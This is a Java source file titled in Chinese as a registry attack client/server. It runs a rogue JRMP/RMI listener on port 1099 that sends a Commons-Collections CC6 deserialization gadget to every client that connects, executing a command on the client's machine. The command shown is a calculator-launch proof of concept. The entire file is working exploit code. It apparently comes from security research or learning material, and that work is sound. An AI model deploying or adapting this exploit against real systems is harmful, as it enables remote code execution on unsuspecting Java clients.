package clientserver;

import sun.rmi.transport.TransportConstants;
import utils.Serializer;

import javax.net.ServerSocketFactory;
import java.io.*;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.rmi.server.UID;

/**
 * @author Whoopsunix
 *
 *  Registry 攻击 Client Server
 */
public class AttackRegistry implements Runnable {

    private int port;
    private Object payloadObject;
    private ServerSocket ss;

    public AttackRegistry(int port, Object payloadObject) throws NumberFormatException, IOException {
        this.port = port;
        this.payloadObject = payloadObject;
        this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);
    }


    public static final void main(String[] args) {
        try {
            Object annotationInvocationHandler = Serializer.cc6("open -a Calculator.app");
//            Object annotationInvocationHandler = Serializer.cc6("calc");
            int port = 1099;

            System.err.println("* Opening JRMP listener on " + port);
            AttackRegistry c = new AttackRegistry(port, annotationInvocationHandler);
            c.run();
        } catch (Exception e) {
            System.err.println("Listener error");
            e.printStackTrace(System.err);
        }
    }

    public void run() {
        try {
            Socket s = null;
            try {
                while ((s = this.ss.accept()) != null) {
                    try {
                        s.setSoTimeout(5000);
                        InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();
                        System.err.println("Have connection from " + remote);

                        InputStream is = s.getInputStream();
                        InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);

                        // Read magic (or HTTP wrapper)
                        bufIn.mark(4);
                        DataInputStream in = new DataInputStream(bufIn);
                        int magic = in.readInt();

                        short version = in.readShort();
                        if (magic != TransportConstants.Magic || version != TransportConstants.Version) {
                            s.close();
                            continue;
                        }

                        OutputStream sockOut = s.getOutputStream();
                        BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);
                        DataOutputStream out = new DataOutputStream(bufOut);

                        byte protocol = in.readByte();
                        switch (protocol) {
                            case TransportConstants.StreamProtocol:
                                out.writeByte(TransportConstants.ProtocolAck);
                                if (remote.getHostName() != null) {
                                    out.writeUTF(remote.getHostName());
                                } else {
                                    out.writeUTF(remote.getAddress().toString());
                                }
                                out.writeInt(remote.getPort());
                                out.flush();
                                in.readUTF();
                                in.readInt();
                            case TransportConstants.SingleOpProtocol:
                                out.writeByte(TransportConstants.Return);
                                ObjectOutputStream oos = new MyOutputStream(out);
                                oos.writeByte(TransportConstants.ExceptionalReturn);
                                new UID().write(oos);
                                oos.writeObject(this.payloadObject);

                                oos.flush();
                                out.flush();

                                break;
                            default:
                            case TransportConstants.MultiplexProtocol:
                                System.err.println("Unsupported protocol");
                                s.close();
                                continue;
                        }

                        bufOut.flush();
                        out.flush();
                    } catch (Exception e) {
                        e.printStackTrace();
                    } finally {
                        System.err.println("Closing connection");
                        s.close();
                    }

                }

            } finally {
                if (s != null) {
                    s.close();
                }
                if (this.ss != null) {
                    this.ss.close();
                }
            }

        } catch (Exception e) {
            e.printStackTrace(System.err);
        }
    }

    class MyOutputStream extends ObjectOutputStream {

        public MyOutputStream(OutputStream out) throws IOException {
            super(out);
        }

        @Override
        protected void annotateClass(Class<?> cl) throws IOException {
            writeObject(null);
        }
    }
}
